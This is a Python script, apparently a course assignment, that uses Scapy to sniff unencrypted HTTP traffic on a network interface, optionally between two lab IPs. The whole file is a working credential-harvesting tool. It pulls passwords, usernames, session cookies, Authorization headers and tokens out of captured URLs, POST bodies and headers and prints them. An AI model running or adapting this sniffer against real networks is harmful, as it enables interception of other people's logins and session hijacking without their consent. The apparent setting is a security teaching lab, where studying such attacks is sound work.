#!/usr/bin/env python3
"""
HTTP Sniffer - Task1, Assignment 2
Sniffs HTTP traffic and extracts sensitive data like passwords, cookies and tokens.
Usage: sudo python3 http_sniffer.py --iface eth0
       sudo python3 http_sniffer.py --iface eth0 --filter 192.168.128.2 192.168.128.4
"""

import argparse
import re
from scapy.all import sniff, conf
from scapy.layers.http import HTTPRequest, HTTPResponse

# Keywords that suggest sensitive data in POST body, URL params or headers
SENSITIVE_KEYS = re.compile(
    r'(password|passwd|pass|pwd|secret|token|auth|api_key|apikey|'
    r'access_token|refresh_token|session|sessionid|login|credential|'
    r'username|user|email)',
    re.IGNORECASE
)

# Patterns to match specific HTTP headers
COOKIE_PATTERN     = re.compile(r'Cookie:\s*(.+)',        re.IGNORECASE)
AUTH_PATTERN       = re.compile(r'Authorization:\s*(.+)', re.IGNORECASE)
SET_COOKIE_PATTERN = re.compile(r'Set-Cookie:\s*(.+)',    re.IGNORECASE)

# Pattern to match key=value pairs in URLs and POST bodies
QUERY_PARAM_PATTERN = re.compile(r'[\?&]([^=]+)=([^&\s]+)')


def extract_from_url(url: str) -> list:
    """Find sensitive key=value pairs in a URL query string."""
    found = []
    for key, value in QUERY_PARAM_PATTERN.findall(url):
        if SENSITIVE_KEYS.search(key):
            found.append(f"  URL param  -> {key}={value}")
    return found


def extract_from_body(body: str) -> list:
    """Find sensitive key=value pairs in a POST body (form-encoded or JSON)."""
    found = []
    # form-encoded body like: username=admin&password=secret
    for key, value in QUERY_PARAM_PATTERN.findall("?" + body):
        if SENSITIVE_KEYS.search(key):
            found.append(f"  POST field -> {key}={value}")
    # JSON body like: {"password": "secret"}
    for key, value in re.findall(r'"(\w+)"\s*:\s*"([^"]+)"', body):
        if SENSITIVE_KEYS.search(key):
            found.append(f"  JSON field -> {key}={value}")
    return found


def extract_from_headers(raw: str) -> list:
    """Extract cookies and auth tokens from raw HTTP headers."""
    found = []
    for match in COOKIE_PATTERN.finditer(raw):
        found.append(f"  Cookie        -> {match.group(1).strip()}")
    for match in AUTH_PATTERN.finditer(raw):
        found.append(f"  Authorization -> {match.group(1).strip()}")
    for match in SET_COOKIE_PATTERN.finditer(raw):
        found.append(f"  Set-Cookie    -> {match.group(1).strip()}")
    return found


def process_packet(pkt):
    """Called for every captured packet. Checks if it contains HTTP with sensitive data."""

    # Only process packets that have an HTTP request or response layer
    if not (pkt.haslayer(HTTPRequest) or pkt.haslayer(HTTPResponse)):
        return

    findings = []

    if pkt.haslayer(HTTPRequest):
        req = pkt[HTTPRequest]
        # Get the requested URL and method
        method = req.Method.decode() if req.Method else "?"
        host   = req.Host.decode()   if req.Host   else "?"
        path   = req.Path.decode()   if req.Path   else "/"

        print(f"\n[HTTP Request] {method} http://{host}{path}")
        # Check URL for sensitive query params
        findings += extract_from_url(path)
        # Build raw header string to check for cookies and auth
        raw_headers = str(req.fields)
        findings += extract_from_headers(raw_headers)

        # Check POST body if present
        if pkt.haslayer("Raw"):
            body = pkt["Raw"].load.decode(errors="ignore")
            findings += extract_from_body(body)

    elif pkt.haslayer(HTTPResponse):
        resp = pkt[HTTPResponse]
        status = resp.Status_Code.decode() if resp.Status_Code else "?"
        print(f"\n[HTTP Response] Status: {status}")
        # Check response headers for Set-Cookie (session tokens etc.)
        raw_headers = str(resp.fields)
        findings += extract_from_headers(raw_headers)

        # Check response body for sensitive data
        if pkt.haslayer("Raw"):
            body = pkt["Raw"].load.decode(errors="ignore")
            findings += extract_from_body(body)

    # Print all findings for this packet
    if findings:
        print("[!] Sensitive data found:")
        for f in findings:
            print(f)
    else:
        print("    No sensitive data detected in this packet.")


def main():
    parser = argparse.ArgumentParser(
        description="HTTP sniffer - extracts sensitive data from HTTP traffic"
    )
    parser.add_argument(
        "--iface", "-i",
        required=True,
        help="Network interface to sniff on (e.g. eth0)"
    )
    parser.add_argument(
        "--filter", "-f",
        nargs=2,
        metavar=("IP1", "IP2"),
        help="Only sniff traffic between these two IPs (optional)"
    )
    args = parser.parse_args()

    conf.iface = args.iface

    # Build BPF filter - always capture only HTTP (port 80)
    # Optionally restrict to traffic between two specific hosts
    if args.filter:
        ip1, ip2 = args.filter
        bpf = f"tcp port 80 and host {ip1} and host {ip2}"
    else:
        bpf = "tcp port 80"

    print(f"[*] Starting HTTP sniffer on {args.iface}")
    print(f"[*] Filter: {bpf}")
    print(f"[*] Waiting for HTTP traffic... (Ctrl-C to stop)\n")

    # Start sniffing - process_packet is called for every captured packet
    sniff(
        iface=args.iface,
        filter=bpf,
        prn=process_packet,
        store=False,
    )


if __name__ == "__main__":
    main()
